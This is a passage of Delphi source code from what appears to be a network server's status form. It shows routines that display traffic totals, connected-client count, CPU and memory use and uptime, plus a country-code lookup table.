  MemStatus: TMemoryStatusEx;
  Uptime: TDateTime;
  Days, Hours, Mins, Secs: Word;
  Usage: Double;
begin
  if not Assigned(FServerManager) then Exit;

  Label1.Caption := 'Server IP: ' + GetLocalIP;
  Label2.Caption := 'Listening: ' + IntToStr(FCurrentPort);
  Label3.Caption := 'Received Data: ' + FormatFloat('0.##', FServerManager.TotalReceivedBytes / 1048576) + ' MB';
  Label4.Caption := 'Sent Data: ' + FormatFloat('0.##', FServerManager.TotalSentBytes / 1048576) + ' MB';
  Label5.Caption := 'Online: ' + IntToStr(FServerManager.ClientCount);

  Usage := GetCPUUsage;
  Label6.Caption := 'CPU Usage: ' + FormatFloat('0', Usage) + '%';
  Label8.Caption := 'Overload: ' + FormatFloat('0', Usage) + '%';

  MemStatus.dwLength := SizeOf(MemStatus);
  if GlobalMemoryStatusEx(MemStatus) then
  begin
    Label7.Caption := 'Memory Usage: ' +
      IntToStr((MemStatus.ullTotalPhys - MemStatus.ullAvailPhys) div 1048576) + ' MB / ' +
      IntToStr(MemStatus.ullTotalPhys div 1048576) + ' MB';
  end;

  Uptime := Now - FStartTime;
  Secs := Trunc(Uptime * 86400) mod 60;
  Mins := Trunc(Uptime * 1440) mod 60;
  Hours := Trunc(Uptime * 24) mod 24;
  Days := Trunc(Uptime);
  Label9.Caption := 'Uptime: ' + IntToStr(Days) + 'd ' + IntToStr(Hours) + 'h ' + IntToStr(Mins) + 'm ' + IntToStr(Secs) + 's';
end;

function TForm1.GetLocalIP: string;
var
  WSAData: TWSAData;
  HostEnt: PHostEnt;
  Name: AnsiString;
begin
  Result := '127.0.0.1';
  if WSAStartup($0202, WSAData) = 0 then
  try
    SetLength(Name, 255);
    GetHostName(PAnsiChar(Name), 255);
    HostEnt := GetHostByName(PAnsiChar(Name));
    if Assigned(HostEnt) and Assigned(HostEnt^.h_addr_list) and Assigned(HostEnt^.h_addr_list^) then
      Result := string(inet_ntoa(PInAddr(HostEnt^.h_addr_list^)^));
  finally
    WSACleanup;
  end;
end;

function TForm1.GetCPUUsage: Double;
var
  IdleTime, KernelTime, UserTime: TFileTime;
  CurrentIdle, CurrentKernel, CurrentUser: Int64;
  IdleDiff, KernelDiff, UserDiff, TotalDiff: Int64;
begin
  Result := 0;
  if GetSystemTimes(IdleTime, KernelTime, UserTime) then
  begin
    CurrentIdle := Int64(IdleTime.dwLowDateTime) or (Int64(IdleTime.dwHighDateTime) shl 32);
    CurrentKernel := Int64(KernelTime.dwLowDateTime) or (Int64(KernelTime.dwHighDateTime) shl 32);
    CurrentUser := Int64(UserTime.dwLowDateTime) or (Int64(UserTime.dwHighDateTime) shl 32);

    if FLastIdleTime <> 0 then
    begin
      IdleDiff := CurrentIdle - FLastIdleTime;
      KernelDiff := CurrentKernel - FLastKernelTime;
      UserDiff := CurrentUser - FLastUserTime;
      TotalDiff := KernelDiff + UserDiff;

      if TotalDiff > 0 then
        Result := (TotalDiff - IdleDiff) * 100 / TotalDiff;
    end;

    FLastIdleTime := CurrentIdle;
    FLastKernelTime := CurrentKernel;
    FLastUserTime := CurrentUser;
  end;
end;


function TForm1.GetCountryIndex(const ACode: string): Integer;
const
  Codes: array[0..254] of string = (
    'AD', 'AE', 'AF', 'AG', 'AI', 'AL', 'AM', 'AO',
    'AR', 'AS', 'AT', 'AU', 'AW', 'AX', 'AZ', 'BA',
    'BB', 'BD', 'BE', 'BF', 'BG', 'BH', 'BI', 'BJ',
    'BL', 'BM', 'BN', 'BO', 'BR', 'BS', 'BT', 'BV',
    'BW', 'BY', 'BZ', 'CA', 'CC', 'CD', 'CF', 'CG',
    'CH', 'CI', 'CK', 'CL', 'CM', 'CN', 'CO', 'CR',
    'CU', 'CV', 'CW', 'CX', 'CY', 'CZ', 'DE', 'DJ',
    'DK', 'DM', 'DO', 'DZ', 'EC', 'EE', 'EG', 'ER',
    'ES', 'ET', 'EU', 'FI', 'FJ', 'FK', 'FM', 'FO',
    'FR', 'GA', 'GB-ENG', 'GB-NIR', 'GB-SCT', 'GB-WLS', 'GB-ZET', 'GB',
    'GD', 'GE', 'GF', 'GG', 'GH', 'GI', 'GL', 'GM',
    'GN', 'GP', 'GQ', 'GR', 'GS', 'GT', 'GU', 'GW',
    'GY', 'HK', 'HM', 'HN', 'HR', 'HT', 'HU', 'ID',
    'IE', 'IL', 'IM', 'IN', 'IO', 'IQ', 'IR', 'IS',
    'IT', 'JE', 'JM', 'JO', 'JP', 'KE', 'KG', 'KH',
    'KI', 'KM', 'KN', 'KP', 'KR', 'KW', 'KY', 'KZ',
    'LA', 'LB', 'LC', 'LGBT', 'LI', 'LK', 'LR', 'LS',
    'LT', 'LU', 'LV', 'LY', 'MA', 'MC', 'MD', 'ME',
    'MF', 'MG', 'MH', 'MK', 'ML', 'MM', 'MN', 'MO',
    'MP', 'MQ', 'MR', 'MS', 'MT', 'MU', 'MV', 'MW',
    'MX', 'MY', 'MZ', 'NA', 'NC', 'NE', 'NF', 'NG',
    'NI', 'NL', 'NO', 'NP', 'NR', 'NU', 'NZ', 'OM',
    'PA', 'PE', 'PF', 'PG', 'PH', 'PK', 'PL', 'PM',
    'PN', 'PR', 'PS', 'PT', 'PW', 'PY', 'QA', 'RE',
    'RO', 'RS', 'RU', 'RW', 'SA', 'SB', 'SC', 'SD',
    'SE', 'SG', 'SH', 'SI', 'SJ', 'SK', 'SL', 'SM',
    'SN', 'SO', 'SR', 'SS', 'ST', 'SV', 'SX', 'SY',
    'SZ', 'TC', 'TD', 'TF', 'TG', 'TH', 'TJ', 'TK',
    'TL', 'TM', 'TN', 'TO', 'TR', 'TT', 'TV', 'TW',
    'TZ', 'UA', 'UG', 'UM', 'US-CA', 'US', 'UY', 'UZ',
    'VA', 'VC', 'VE', 'VG', 'VI', 'VN', 'VU', 'WF',
    'WS', 'XK', 'YE', 'YT', 'ZA', 'ZM', 'ZW');
var
  i: Integer;
begin
  Result := -1;
  for i := Low(Codes) to High(Codes) do
    if SameText(Trim(Codes[i]), Trim(ACode)) then
    begin
      Result := i;
      Break;
    end;
end;

end.
